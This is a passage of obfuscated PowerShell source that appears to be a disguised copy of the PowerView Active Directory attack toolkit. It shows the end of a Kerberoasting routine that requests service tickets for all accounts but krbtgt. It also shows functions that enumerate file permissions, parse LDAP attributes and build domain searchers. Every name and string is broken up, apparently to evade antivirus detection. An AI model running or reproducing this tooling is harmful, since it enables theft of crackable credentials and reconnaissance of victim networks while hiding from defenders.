        if (${P`SB`oU`NDp`Ar`AMeTERs}[("{0}{3}{4}{2}{1}" -f 'Ser','it','meLim','ve','rTi')]) { ${U`sERSEaR`cHERAR`Gu`MeNts}[("{2}{1}{3}{0}"-f 'Limit','Tim','Server','e')] = ${s`E`RVert`ImeL`ImIT} }
        if (${p`sboUn`d`parAm`eTeRS}[("{1}{0}{3}{2}"-f 'o','Tombst','e','n')]) { ${uSer`Sea`RCh`eRaRg`U`m`ENTS}[("{1}{2}{0}"-f 'ne','Tom','bsto')] = ${TomBs`T`oNe} }
        if (${p`s`Boun`dPARA`metE`Rs}[("{3}{2}{0}{1}"-f'ntia','l','de','Cre')]) { ${uSERS`EARC`h`eRaRGumEN`Ts}[("{2}{0}{1}"-f 'red','ential','C')] = ${crEDeN`T`I`Al} }

        if (${PSbOUn`d`PA`Ra`MeTeRs}[("{1}{0}{2}" -f't','Creden','ial')]) {
            ${L`oG`On`TOKEn} = &("{2}{0}{3}{1}{4}"-f'ok','Impersona','Inv','e-User','tion') -Credential ${cREdE`N`Ti`AL}
        }
    }

    PROCESS {
        if (${psB`OUN`dPAR`AM`eTers}[("{2}{0}{1}"-f 'tit','y','Iden')]) { ${Users`eArC`hE`RARG`Um`e`NTS}[("{1}{2}{0}"-f'ity','Iden','t')] = ${iDenT`I`Ty} }
        &("{1}{0}{2}{3}" -f't-Dom','Ge','ainUse','r') @UserSearcherArguments | &("{3}{1}{0}{2}"-f'jec','here-Ob','t','W') {${_}."s`Am`Ac`COuNTN`AME" -ne ("{0}{1}"-f'kr','btgt')} | &("{2}{0}{5}{3}{4}{1}"-f 'D','cket','Get-','mainS','PNTi','o') -OutputFormat ${OuTpU`T`FOrmat}
    }

    END {
        if (${lO`gO`NTO`kEn}) {
            &("{1}{0}{3}{2}"-f'voke-R','In','ertToSelf','ev') -TokenHandle ${L`oGOnT`okEn}
        }
    }
}


function Get`-PaTh`ACl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{2}{4}{0}{1}" -f 'l','dProcess','Sho','PS','u'}, '')]
    [OutputType({"{3}{0}{2}{1}{4}" -f'w','iew.Fi','erV','Po','leACL'})]
    [CmdletBinding()]
    Param(
        [Parameter(maNDAToRy = ${Tr`Ue}, ValUEFROmPiPElInE = ${T`RUe}, vaLuEfroMpIpeLInEbYPrOPertyNAme = ${t`RUe})]
        [Alias({"{1}{2}{0}"-f'Name','Ful','l'})]
        [String[]]
        ${Pa`Th},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cre`dENti`Al} =  (gEt-VaRiaBlE ('q'+'Fn')  )."VAL`UE"::"eM`pty"
    )

    BEGIN {

        function C`On`VeRt-FIlerIG`Ht {
            
            [CmdletBinding()]
            Param(
                [Int]
                ${f`sR}
            )

            ${a`CcE`SS`Mask} = @{
                [uint32]("{2}{0}{1}" -f '0','00','0x80000') = ("{2}{1}{0}"-f 'icRead','ener','G')
                [uint32]("{0}{1}{2}" -f '0x40','0000','00') = ("{2}{3}{0}{1}"-f 'r','ite','G','enericW')
                [uint32]("{2}{0}{1}"-f'2000','0000','0x') = ("{2}{3}{1}{0}"-f'ecute','ricEx','Ge','ne')
                [uint32]("{1}{0}{3}{2}"-f'100','0x','00','000') = ("{1}{2}{0}" -f 'icAll','Gen','er')
                [uint32]("{0}{1}{2}" -f '0','x020000','00') = ("{1}{2}{0}"-f'owed','MaximumA','ll')
                [uint32]("{0}{2}{3}{1}" -f '0','000','x0','1000') = ("{4}{1}{2}{0}{3}{5}"-f 'sSy','cc','es','ste','A','mSecurity')
                [uint32]("{0}{2}{1}" -f'0','00100000','x') = ("{0}{2}{1}" -f 'Sync','ze','hroni')
                [uint32]("{3}{0}{1}{2}" -f'0','0','00','0x0008') = ("{2}{0}{1}"-f 'it','eOwner','Wr')
                [uint32]("{0}{1}{2}" -f'0x','0004000','0') = ("{1}{0}"-f 'teDAC','Wri')
                [uint32]("{1}{2}{0}" -f '020000','0x0','0') = ("{1}{0}{2}" -f 'ea','R','dControl')
                [uint32]("{0}{1}{2}"-f '0x','00','010000') = ("{1}{0}" -f 'elete','D')
                [uint32]("{1}{2}{0}"-f '100','0','x00000') = ("{2}{0}{3}{1}"-f'ite','s','Wr','Attribute')
                [uint32]("{2}{0}{1}" -f 'x0000008','0','0') = ("{2}{1}{0}{3}"-f'ute','Attrib','Read','s')
                [uint32]("{0}{2}{1}"-f '0x000','0','0004') = ("{2}{1}{3}{0}"-f'eChild','e','Del','t')
                [uint32]("{0}{2}{1}"-f '0','00000020','x') = ("{3}{1}{2}{4}{0}" -f'raverse','xecu','t','E','e/T')
                [uint32]("{0}{1}{2}" -f '0x0','00000','10') = ("{2}{3}{0}{5}{4}{1}" -f 'te','ributes','Wri','teEx','t','ndedAt')
                [uint32]("{0}{2}{1}"-f'0x00','08','0000') = ("{1}{0}{2}{4}{3}" -f 'eadExtende','R','d','ibutes','Attr')
                [uint32]("{2}{1}{0}"-f '4','0000','0x000') = ("{2}{0}{6}{3}{5}{4}{1}"-f 'pendD','ry','Ap','ddSubd','recto','i','ata/A')
                [uint32]("{1}{0}{2}"-f '00000','0x00','2') = ("{1}{2}{0}{3}"-f'teData/AddFi','W','ri','le')
                [uint32]("{0}{2}{1}"-f'0x0000','1','000') = ("{3}{6}{0}{5}{1}{4}{2}" -f'ta/','tDir','y','Read','ector','Lis','Da')
            }

            ${sI`MPLePe`RM`isSi`onS} = @{
                [uint32]("{0}{2}{1}"-f'0x','f01ff','1') = ("{0}{3}{2}{1}" -f'Ful','ntrol','o','lC')
                [uint32]("{2}{0}{1}"-f'03','01bf','0x') = ("{1}{0}" -f'ify','Mod')
                [uint32]("{0}{2}{1}" -f '0x0','a9','200') = ("{1}{0}{2}{3}"-f'And','Read','Exe','cute')
                [uint32]("{0}{1}{2}" -f'0x02','01','9f') = ("{2}{1}{0}"-f'dWrite','eadAn','R')
                [uint32]("{2}{0}{1}"-f'008','9','0x02') = ("{0}{1}"-f 'R','ead')
                [uint32]("{1}{0}"-f'16','0x0001') = ("{0}{1}"-f'Wr','ite')
            }

            ${PEr`MiSsI`O`Ns} = @()

            
            ${pER`mi`ssIO`NS} += ${Simp`lEP`erM`IsSIo`Ns}."KE`YS" | &("{2}{0}{3}{4}{1}"-f 'ac','ect','ForE','h-Ob','j') {
                              if ((${F`sR} -band ${_}) -eq ${_}) {
                                ${SiMPl`Ep`e`RMiSsIO`Ns}[${_}]
                                ${F`sr} = ${f`Sr} -band (-not ${_})
                              }
                            }

            
            ${PERMi`Ss`iONS} += ${acC`e`sS`MASk}."ke`ys" | &("{1}{0}{3}{2}"-f 'ere-','Wh','bject','O') { ${F`sR} -band ${_} } | &("{3}{4}{1}{2}{0}" -f'ject','Each-','Ob','Fo','r') { ${a`c`Ces`sMaSK}[${_}] }
            (${Per`MI`Ssio`Ns} | &("{0}{2}{1}"-f'Where-Ob','ect','j') {${_}}) -join ','
        }

        ${C`oNve`Rt`ARG`UmEnTs} = @{}
        if (${PS`BOunDPA`R`A`me`TeRS}[("{1}{0}{2}"-f'ti','Creden','al')]) { ${c`o`NV`eRTaRGum`E`NTs}[("{1}{0}{2}"-f'dent','Cre','ial')] = ${CRedE`NTi`AL} }

        ${m`A`ppEdcomP`UtErS} = @{}
    }

    PROCESS {
        ForEach (${tARG`Et`PaTH} in ${p`ATh}) {
            try {
                if ((${tAR`GET`pATh} -Match ((("{6}{4}{0}{1}{2}{3}{5}"-f '{','0}.','*{0}{0','}.','{0}{0}','*','{0}'))-F  [CHAR]92)) -and (${PSb`OUNDpar`A`MeTeRS}[("{2}{0}{1}"-f 't','ial','Creden')])) {
                    ${Hostc`OM`PuTEr} = (&("{1}{0}{2}"-f'e','N','w-Object') ("{2}{0}{1}"-f 'Ur','i','System.')(${tA`R`GETPA`TH}))."H`oSt"
                    if (-not ${M`Ap`peD`CO`mpUTeRS}[${hOs`T`cOMp`UtEr}]) {
                        
                        &("{1}{4}{5}{3}{2}{0}" -f'Connection','A','te','Remo','d','d-') -ComputerName ${HOS`T`C`OmP`UTEr} -Credential ${CR`Ed`E`NTIaL}
                        ${m`AP`PED`compu`TERs}[${HoST`cOMpu`TeR}] = ${TR`Ue}
                    }
                }

                ${a`cl} = &("{2}{1}{0}" -f 'l','Ac','Get-') -Path ${TargE`T`Pa`TH}

                ${a`Cl}."G`EtA`CCes`sRUlES"(${tR`Ue}, ${t`RUE}, [System.Security.Principal.SecurityIdentifier]) | &("{0}{1}{2}{3}" -f'ForEa','c','h-Obj','ect') {
                    ${S`iD} = ${_}."idenT`itY`R`E`FEreNce"."V`ALUe"
                    ${n`Ame} = &("{1}{2}{0}{3}"-f 'S','Convert','From-','ID') -ObjectSID ${s`iD} @ConvertArguments

                    ${O`UT} = &("{1}{0}{2}"-f 'jec','New-Ob','t') ("{2}{0}{1}"-f 'SObj','ect','P')
                    ${O`UT} | &("{1}{0}{2}"-f'-','Add','Member') ("{0}{2}{1}"-f'N','property','ote') ("{0}{1}" -f'Pat','h') ${T`A`RG`ETPaTh}
                    ${O`UT} | &("{2}{1}{0}" -f 'ember','dd-M','A') ("{0}{3}{2}{1}"-f'N','rty','e','oteprop') ("{3}{2}{1}{0}"-f'Rights','m','ileSyste','F') (&("{4}{3}{1}{0}{5}{2}"-f 'rt-Fil','ve','ht','on','C','eRig') -FSR ${_}."FilesYSTEm`RIG`Hts"."v`AlUE__")
                    ${O`UT} | &("{1}{0}{2}"-f 'b','Add-Mem','er') ("{0}{2}{1}"-f'No','property','te') ("{2}{0}{3}{1}" -f'efer','e','IdentityR','enc') ${nA`ME}
                    ${o`UT} | &("{2}{3}{0}{1}"-f'Membe','r','Add','-') ("{2}{0}{1}{3}" -f'o','tepr','N','operty') ("{1}{3}{2}{0}" -f'SID','Iden','ty','ti') ${s`Id}
                    ${o`UT} | &("{2}{1}{0}"-f 'Member','dd-','A') ("{3}{0}{1}{2}" -f'prop','e','rty','Note') ("{2}{3}{0}{4}{1}" -f'ro','pe','Access','Cont','lTy') ${_}."A`cc`esScO`Nt`RoLtY`pE"
                    ${O`UT}."Psob`ject"."TyPeN`AmeS".("{1}{0}{2}" -f 's','In','ert').Invoke(0, ("{1}{3}{2}{0}{4}{5}"-f'.','Pow','View','er','Fil','eACL'))
                    ${o`UT}
                }
            }
            catch {
                &("{0}{2}{1}{3}"-f 'W','te-','ri','Verbose') ('[G'+'et-P'+'a'+'thA'+'cl] '+'err'+'or: '+"$_")
            }
        }
    }

    END {
        
        ${M`Ap`pEdC`O`mpUters}."Ke`Ys" | &("{6}{0}{1}{5}{4}{3}{2}" -f 'mo','ve','on','Connecti','ote','-Rem','Re')
    }
}


function C`ONv`Er`T-`ldAPprOPE`R`Ty {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{0}{2}" -f'uldProce','SSho','ss','P'}, '')]
    [OutputType({"{0}{8}{3}{2}{7}{5}{6}{4}{1}" -f 'System.Manageme','ect','.','t','mObj','omation.','PSCusto','Aut','n'})]
    [CmdletBinding()]
    Param(
        [Parameter(manDAtORY = ${Tr`UE}, vAluEFrOmpIpEline = ${tR`UE})]
        [ValidateNotNullOrEmpty()]
        ${PRO`peRTI`es}
    )

    ${OBj`E`c`TPRoperT`i`ES} = @{}

    ${Pr`OPERT`ies}."PR`oPE`RTy`Na`MEs" | &("{0}{4}{3}{1}{2}"-f 'ForEac','jec','t','b','h-O') {
        if (${_} -ne ("{2}{0}{1}"-f 'sp','ath','ad')) {
            if ((${_} -eq ("{1}{2}{0}"-f 'id','obje','cts')) -or (${_} -eq ("{0}{1}{2}{3}" -f'sidhi','st','or','y'))) {
                
                ${ob`je`ctPr`oP`ertiEs}[${_}] = ${pRopEr`T`IeS}[${_}] | &("{1}{0}{2}" -f'ch-Objec','ForEa','t') { (&("{1}{2}{0}"-f 'bject','New-','O') ("{3}{9}{10}{2}{1}{5}{0}{7}{8}{11}{4}{6}" -f'p','Prin','.','System.Se','fi','ci','er','al.Security','Ident','curit','y','i')(${_}, 0))."v`ALuE" }
            }
            elseif (${_} -eq ("{1}{0}"-f'pe','groupty')) {
                ${OBjec`Tp`RO`PeRties}[${_}] = ${proP`e`RTiEs}[${_}][0] -as ${g`R`OUpty`pEeNuM}
            }
            elseif (${_} -eq ("{2}{1}{0}" -f'ype','tt','samaccoun')) {
                ${objEctPR`O`p`erTiES}[${_}] = ${PROp`ERti`eS}[${_}][0] -as ${S`Ama`CC`oUntt`yPeEnuM}
            }
            elseif (${_} -eq ("{0}{1}{2}"-f'obje','c','tguid')) {
                
                ${O`Bj`eCtprope`RT`IEs}[${_}] = (&("{1}{0}{2}" -f 'w-Obje','Ne','ct') ("{1}{0}" -f'uid','G') (,${PRo`pert`I`Es}[${_}][0]))."gU`id"
            }
            elseif (${_} -eq ("{1}{3}{0}{2}" -f 'cc','us','ountcontrol','era')) {
                ${O`Bj`e`CTpROP`E`RTiES}[${_}] = ${P`RopErTi`es}[${_}][0] -as ${uAC`EN`Um}
            }
            elseif (${_} -eq ("{6}{2}{4}{3}{0}{1}{5}" -f 'r','i','tsecuri','desc','ty','ptor','n')) {
                
                ${D`eSc`RI`PtoR} = &("{2}{0}{1}"-f 'ew-O','bject','N') ("{2}{0}{6}{3}{4}{5}{1}{8}{7}"-f 'y.Acce','ecurityDes','Securit','on','trol.Raw','S','ssC','or','cript') -ArgumentList ${p`ROp`ertiEs}[${_}][0], 0
                if (${de`SCrIpT`Or}."OwN`eR") {
                    ${Obje`C`T`PrOpE`RtiES}[("{0}{1}" -f 'Owne','r')] = ${DesC`RiPT`OR}."OWn`Er"
                }
                if (${Desc`R`iP`TOr}."G`Roup") {
                    ${O`BjeC`TP`Rop`ER`Ties}[("{0}{1}" -f'Gro','up')] = ${de`SCRiPt`or}."GR`oUP"
                }
                if (${De`s`cR`iPTOr}."DI`S`c`RETIonar`Yacl") {
                    ${ObJEc`TprO`PeRT`IES}[("{0}{3}{1}{2}"-f'Dis','io','naryAcl','cret')] = ${Des`CRIp`T`or}."DISC`R`E`TIo`NArYAcL"
                }
                if (${d`Escr`IpTor}."SySt`em`ACl") {
                    ${ObJEc`Tpr`o`perT`IEs}[("{0}{2}{1}" -f 'S','stemAcl','y')] = ${De`sc`RIPt`or}."sY`st`emaCl"
                }
            }
            elseif (${_} -eq ("{1}{3}{2}{0}"-f 'res','a','countexpi','c')) {
                if (${Pr`OPer`T`ies}[${_}][0] -gt   ${j1`LGM}::"m`AXVA`luE"."T`ickS") {
                    ${Ob`jE`ctPRope`RtIES}[${_}] = ("{1}{0}"-f'ER','NEV')
                }
                else {
                    ${OB`Je`CtPRo`PErti`eS}[${_}] =   ( cHilDiTem ("{1}{2}{3}{0}" -f'gM','VariAbl','E',':j1L') )."V`ALUe"::"frOM`FiLe`TI`Me"(${PRo`PERt`IeS}[${_}][0])
                }
            }
            elseif ( (${_} -eq ("{3}{0}{2}{1}" -f'l','on','og','last')) -or (${_} -eq ("{0}{2}{4}{1}{3}" -f 'lastlogonti','t','me','amp','s')) -or (${_} -eq ("{0}{2}{1}" -f 'pwdl','et','asts')) -or (${_} -eq ("{1}{2}{0}" -f 'f','lastl','ogof')) -or (${_} -eq ("{2}{4}{3}{0}{1}"-f 'dT','ime','badP','swor','as')) ) {
                
                if (${PR`OPe`R`TiES}[${_}][0] -is [System.MarshalByRefObject]) {
                    
                    ${TE`MP} = ${P`RO`pERtiES}[${_}][0]
                    [Int32]${H`iGH} = ${te`mP}.("{0}{1}"-f'GetTy','pe').Invoke().("{0}{2}{1}"-f'InvokeMem','er','b').Invoke(("{0}{1}{2}"-f 'HighP','a','rt'),  ${e`xod}::"g`Etprope`RtY", ${N`UlL}, ${t`emp}, ${N`ULl})
                    [Int32]${L`ow}  = ${te`Mp}.("{1}{0}" -f'pe','GetTy').Invoke().("{1}{2}{0}{3}" -f'ok','In','v','eMember').Invoke(("{1}{0}" -f'rt','LowPa'),   (Get-variAble  ("{0}{1}"-f 'EX','OD') )."Va`lUe"::"GEt`PROPER`Ty", ${nU`LL}, ${Te`MP}, ${NU`ll})
                    ${oBj`EcTp`Rop`e`RTiES}[${_}] = ( (Gi  ("{0}{1}{3}{2}"-f'VA','r','1Lgm','iAblE:J') )."va`lUE"::"froMF`iL`eT`ime"([Int64]("0x{0:x8}{1:x8}" -f ${H`igh}, ${L`oW})))
                }
                else {
                    
                    ${OBJ`EctpR`oPe`Rti`Es}[${_}] = ( ${J`1LGM}::"frOm`F`ileTI`me"((${PR`O`Pe`RTIEs}[${_}][0])))
                }
            }
            elseif (${p`RoP`Erties}[${_}][0] -is [System.MarshalByRefObject]) {
                
                ${pR`oP} = ${pr`OP`ERtIES}[${_}]
                try {
                    ${tE`mP} = ${P`ROP}[${_}][0]
                    [Int32]${H`iGH} = ${t`eMp}.("{2}{0}{1}" -f 'Ty','pe','Get').Invoke().("{2}{1}{3}{0}" -f 'mber','nvo','I','keMe').Invoke(("{1}{2}{0}"-f'art','Hig','hP'),   ( GeT-chilDiTEM ("{0}{2}{3}{1}" -f'VAR','Le:ExOd','iA','b')  )."va`lUE"::"G`eTP`R`oPeRtY", ${nU`Ll}, ${T`emP}, ${N`ULl})
                    [Int32]${L`Ow}  = ${tE`mp}.("{0}{2}{1}"-f'G','Type','et').Invoke().("{2}{1}{0}" -f 'ember','okeM','Inv').Invoke(("{0}{2}{1}"-f'Lo','Part','w'),   (  gEt-CHILDitem ("{1}{2}{0}" -f'LE:exOd','vARia','b'))."v`AluE"::"G`ETpropeR`Ty", ${nu`ll}, ${tE`mp}, ${n`Ull})
                    ${ob`jEctPrO`peRT`iES}[${_}] = [Int64]("0x{0:x8}{1:x8}" -f ${h`IGh}, ${l`OW})
                }
                catch {
                    &("{3}{1}{0}{4}{2}"-f't','i','se','Wr','e-Verbo') ('[C'+'onve'+'rt-LDAP'+'Pr'+'operty] '+'e'+'rr'+'or: '+"$_")
                    ${obJEcTPro`pE`RT`ies}[${_}] = ${P`Rop}[${_}]
                }
            }
            elseif (${pROPert`I`eS}[${_}]."cO`UNt" -eq 1) {
                ${o`BjEc`TpRoP`ErTIEs}[${_}] = ${prO`Pe`Rt`iEs}[${_}][0]
            }
            else {
                ${OBjEctPrOpe`R`T`ies}[${_}] = ${p`ROP`E`RtIes}[${_}]
            }
        }
    }
    try {
        &("{0}{2}{1}" -f 'Ne','ct','w-Obje') -TypeName ("{1}{0}" -f 'ct','PSObje') -Property ${Obj`E`CTPR`O`Pe`RtieS}
    }
    catch {
        &("{1}{0}{2}"-f'-Warnin','Write','g') ('[Co'+'nver'+'t'+'-L'+'DAPPr'+'operty] '+'E'+'rror '+'pa'+'rs'+'ing '+'LD'+'AP '+'prop'+'ert'+'ies '+': '+"$_")
    }
}








function gET`-`DomaI`N`sEarCHEr {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{4}{3}{1}" -f'SSh','rocess','P','P','ould'}, '')]
    [OutputType({"{6}{7}{4}{0}{5}{1}{3}{2}"-f 'm.Dir','ryServices.Dir','her','ectorySearc','e','ecto','Sy','st'})]
    [CmdletBinding()]
    Param(
        [Parameter(vALuEfRoMPipEline = ${T`Rue})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${DOM`A`iN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f'r','Filte'})]
        [String]
        ${LdAPF`i`L`TeR},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pROP`eRt`Ies},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}"-f'ADSP','th','a'})]
        [String]
        ${Se`A`RchBAsE},

        [ValidateNotNullOrEmpty()]
        [String]
        ${SE`ArCh`B`ASEP`R`Efix},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{0}{1}{2}" -f'ntro','l','ler','DomainCo'})]
        [String]
        ${sE`RvER},

        [ValidateSet({"{1}{0}" -f 'e','Bas'}, {"{2}{0}{1}"-f'e','Level','On'}, {"{1}{2}{0}"-f'ree','Su','bt'})]
        [String]
        ${sEaR`C`hsCO`pE} = ("{2}{0}{1}"-f 'ubt','ree','S'),

        [ValidateRange(1, 10000)]
        [Int]
        ${r`eSU`L`TpaGE`siZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${seR`VE`R`TIM`eLIMIt} = 120,

        [ValidateSet({"{1}{0}" -f 'l','Dac'}, {"{0}{1}" -f'Gr','oup'}, {"{0}{1}" -f 'No','ne'}, {"{1}{0}" -f 'r','Owne'}, {"{1}{0}" -f 'acl','S'})]
        [String]
        ${seCu`Ri`TyMaSks},

        [Switch]
        ${T`OMbS`T`oNe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`ed`eNTIAL} =   (gET-vARIABLE  ('Qf'+'n') -vALUEon )::"EMp`Ty"
    )

    PROCESS {
        if (${PSbOunD`PA`Ra`M`ETE`Rs}[("{2}{0}{1}" -f'a','in','Dom')]) {
            ${t`A`Rget`doMaIN} = ${d`omAIn}

            if (${en`V:Us`ErDNsdo`MaiN} -and (${Env:U`seRdn`SdOm`AIN}.("{1}{0}" -f'm','Tri').Invoke() -ne '')) {
                
                ${u`SERdo`Main} = ${Env:US`E`RdnS`D`OmAin}
                if (${eNV:`lOgo`NsERVeR} -and (${e`NV:LO`gOn`SeRVER}.("{1}{0}"-f 'rim','T').Invoke() -ne '') -and ${USe`R`DOma`In}) {
                    ${B`INd`SeRv`ER} = "$($ENV:LOGONSERVER -replace '\\','').$UserDomain"
                }
            }
        }
        elseif (${p`sbo`UnDpA`R`AMete`RS}[("{1}{3}{2}{0}"-f'l','Cr','ntia','ede')]) {
            
            ${DOMaI`NO`Bje`ct} = &("{2}{1}{0}" -f 'omain','-D','Get') -Credential ${cREDe`N`TIAL}
            ${b`I`NDSeRvER} = (${DomaIN`oBJ`E`CT}."PDCr`O`LEOwnEr")."n`AME"
            ${T`ArgE`TDoM`A`In} = ${DOmA`iNObj`eCt}."na`Me"
        }
        elseif (${e`Nv:U`SE`R`dN`SdOMain} -and (${eN`V:`US`eRdnSdOMa`IN}.("{1}{0}" -f'im','Tr').Invoke() -ne '')) {
            
            ${t`Arg`E`TdOMAin} = ${ENv`:uS`ErDns`doMAIn}
            if (${en`V:`LOgO`NSer`VeR} -and (${eNv:`logO`NsE`R`VeR}.("{1}{0}" -f 'rim','T').Invoke() -ne '') -and ${taRG`E`TDoMAin}) {
                ${B`in`dsER`VEr} = "$($ENV:LOGONSERVER -replace '\\','').$TargetDomain"
            }
        }
        else {
            
            &("{1}{2}{0}" -f 'ose','writ','e-verb') ("{2}{1}{0}" -f 'in','oma','get-d')
            ${Do`MaiNob`JECt} = &("{2}{0}{1}" -f'Domai','n','Get-')
            ${BIn`DS`Er`VER} = (${DomaInoBJ`e`ct}."PDcr`O`le`OWNeR")."N`AmE"
            ${tA`RGe`TD`omA`in} = ${do`MaIn`OBjecT}."n`AMe"
        }

        if (${pSb`OuNDp`AR`A`ME`TeRS}[("{1}{0}"-f 'rver','Se')]) {
            
            ${b`IndseRV`Er} = ${Ser`V`ER}
        }

        ${seArC`h`S`TrING} = ("{1}{0}"-f'P://','LDA')

        if (${BiN`d`Se`RVER} -and (${binDS`ER`V`Er}.("{0}{1}"-f'T','rim').Invoke() -ne '')) {
            ${SEArC`H`S`TriNG} += ${BinD`S`erV`eR}
            if (${ta`Rg`etDoMA`in}) {
                ${sE`AR`CHString} += '/'
            }
        }

        if (${pS`Bo`UndPArAm`eTERs}[("{1}{2}{4}{0}{3}" -f 'f','SearchB','asePr','ix','e')]) {
            ${Se`A`RChS`TriNG} += ${s`Ea`RcH`BAsepREfiX} + ','
        }

        if (${P`S`BO`UN`DPARameTE`RS}[("{2}{1}{3}{0}" -f 'se','hB','Searc','a')]) {
            if (${s`eARc`hB`AsE} -Match ("{0}{1}{2}" -f'^G','C:/','/')) {
                
                ${Dn} = ${Se`A`RC`hbASE}.("{1}{0}{2}"-f'U','To','pper').Invoke().("{0}{1}"-f'Tri','m').Invoke('/')
                ${sEArcHS`T`R`iNG} = ''
            }
            else {
                if (${se`ARcH`B`AsE} -match ("{2}{0}{1}" -f 'AP:/','/','^LD')) {
                    if (${SEa`Rc`HBa`sE} -match ("{1}{0}{2}" -f 'A','LD','P://.+/.+')) {
                        ${seA`RcHst`R`i`NG} = ''
                        ${Dn} = ${SeAR`CH`B`Ase}
                    }
                    else {
                        ${Dn} = ${sEaRch`B`A`se}.("{2}{1}{0}" -f 'ing','r','SubSt').Invoke(7)
                    }
                }
                else {
                    ${d`N} = ${S`eArCH`BASe}
                }
            }
        }
        else {
            
            if (${tAr`ge`Td`oMAIn} -and (${Ta`RGET`dOM`A`iN}.("{0}{1}"-f'Tri','m').Invoke() -ne '')) {
                ${D`N} = "DC=$($TargetDomain.Replace('.', ',DC='))"
            }
        }

        ${se`A`RcHsTR`INg} += ${D`N}
        &("{0}{2}{3}{1}"-f 'Writ','e','e-','Verbos') ('[G'+'e'+'t-Dom'+'ai'+'nS'+'earcher'+'] '+'s'+'e'+'arch '+'base'+': '+"$SearchString")

        if (${CR`ed`e`NTIal} -ne  ( VaRIaBLe  ("{0}{1}"-f'Q','fN'))."V`ALUE"::"e`mpty") {
            &("{3}{0}{2}{1}"-f 'te-V','e','erbos','Wri') ("{16}{20}{7}{1}{6}{19}{8}{13}{18}{9}{4}{5}{17}{12}{3}{0}{11}{2}{15}{10}{14}" -f 'tial','m','P','den','g ','alte','ainSea','Do','che','n','c','s for LDA','re','r','onnection',' ','[Ge','rnate c','] Usi','r','t-')
            
            ${DOM`AIN`O`BjE`cT} = &("{1}{2}{3}{0}" -f't','Ne','w-Ob','jec') ("{2}{1}{0}{6}{7}{8}{4}{5}{3}"-f'ct','e','Dir','y','t','r','oryServices','.Director','yEn')(${seArc`h`STri`NG}, ${crEDE`N`TI`AL}."u`SErname", ${cRed`en`Tial}.("{3}{1}{2}{4}{6}{0}{5}"-f'ede','tNe','twor','Ge','k','ntial','Cr').Invoke()."pASSwo`RD")
            ${SEA`RCHEr} = &("{0}{1}{2}"-f'Ne','w','-Object') ("{7}{6}{3}{4}{1}{2}{0}{8}{5}"-f 'D','Services','.','c','tory','ectorySearcher','em.Dire','Syst','ir')(${d`OMa`IN`objeCt})
        }
        else {
            
            ${se`ArcH`er} = &("{0}{2}{1}" -f'New-Obj','ct','e') ("{5}{7}{8}{6}{2}{9}{0}{3}{4}{1}{10}"-f 'ices.','rySe','ect','Di','recto','Syste','ir','m.','D','oryServ','archer')([ADSI]${sE`ARch`sTRInG})
        }

        ${SEaR`CH`er}."P`AGeS`IZe" = ${re`s`UL`TpA`gEsiZE}
        ${SE`ArCH`Er}."SE`A`RCHS`cOpE" = ${sea`RChS`CoPe}
        ${S`e`ArCh`eR}."cacHer`E`SULtS" = ${f`Alse}
        ${seARc`h`ER}."RE`FerraLc`HasIng" =   ${d`VX}::"a`Ll"

        if (${psBou`NdPAra`M`e`TE`Rs}[("{2}{0}{3}{1}" -f'r','imeLimit','Se','verT')]) {
            ${sEa`RcH`ER}."SE`RV`er`TImeli`MIT" = ${S`ERverT`ImEl`iM`it}
        }

        if (${PsboUndP`ARAme`T`erS}[("{2}{0}{1}" -f'o','ne','Tombst')]) {
            ${se`A`RChER}."T`oMBs`ToNE" = ${Tr`Ue}
        }

        if (${pS`BoundPa`RAm`e`TeRs}[("{1}{2}{0}"-f'ter','L','DAPFil')]) {
            ${s`Ea`RCheR}."fil`TEr" = ${ld`Apf`I`ltER}
        }

        if (${p`SBoundPA`RA`Me`TERs}[("{0}{1}{2}"-f'Sec','urityMas','ks')]) {
            ${s`e`ArcHeR}."s`ecUriT`ym`AS`kS" = Switch (${SE`CU`R`ItyMas`KS}) {
                ("{0}{1}"-f 'D','acl') {  (dIr ("{1}{2}{0}{3}" -f'e:','VARIab','l','SJguO'))."VA`LUE"::"D`AcL" }
                ("{1}{0}"-f'up','Gro') {  (  GET-vArIAblE ("sj"+"GUO")  -va  )::"grO`Up" }
                ("{1}{0}" -f'ne','No') {   ${sJ`GuO}::"No`Ne" }
                ("{1}{0}" -f 'r','Owne') {   ${S`jguO}::"O`wNEr" }
                ("{1}{0}"-f'cl','Sa') {  (VARiABLe  ("{0}{1}"-f 'Sj','gUO'))."V`ALUE"::"SA`Cl" }
            }
        }

        if (${p`sbou`NDPARAMeTE`Rs}[("{0}{2}{3}{1}"-f 'P','ties','r','oper')]) {
            
            ${p`ROP`e`RtieStoLoAD} = ${p`ROpe`RtI`eS}| &("{3}{1}{2}{0}"-f 'bject','rEac','h-O','Fo') { ${_}.("{0}{1}" -f 'Sp','lit').Invoke(',') }
            ${N`ULl} = ${sE`A`R`cher}."p`R`opERtIE`s`TOLo`AD".("{1}{0}{2}"-f 'd','A','dRange').Invoke((${Pr`oPerT`IesTo`Lo`AD}))
        }

        ${S`E`ArcHer}
    }
}


function C`OnvE`RT`-Dn`srEcord {


    [OutputType({"{10}{3}{8}{0}{2}{7}{6}{11}{4}{9}{5}{1}"-f 'nagement.Autom','ect','a','M','tom','j','C','tion.PS','a','Ob','System.','us'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOSiTIon = 0, MANDatoRy = ${T`RUE}, VALUeFrOMPipELiNEBYPROPeRTYnAME = ${Tr`Ue})]
        [Byte[]]
        ${DnS`RE`CoRD}
    )

    BEGIN {
        function G`Et-`NamE {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{4}{2}{5}{6}{1}{0}" -f'y','tl','tTyp','P','SUseOutpu','e','Correc'}, '')]
            [CmdletBinding()]
            Param(
                [Byte[]]
                ${R`AW}
            )

            [Int]${leNG`TH} = ${R`Aw}[0]
            [Int]${SE`g`menTs} = ${r`Aw}[1]
